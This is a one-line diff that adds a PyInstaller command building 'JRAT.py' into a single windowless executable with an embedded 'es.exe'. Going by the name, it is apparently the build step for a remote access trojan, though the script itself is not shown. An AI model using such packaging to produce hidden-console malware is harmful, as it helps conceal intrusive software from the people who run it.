@@ -1,0 +1,1 @@
+pyinstaller --onefile --noconsole -i "NONE" --add-binary="es.exe;." .\JRAT.py
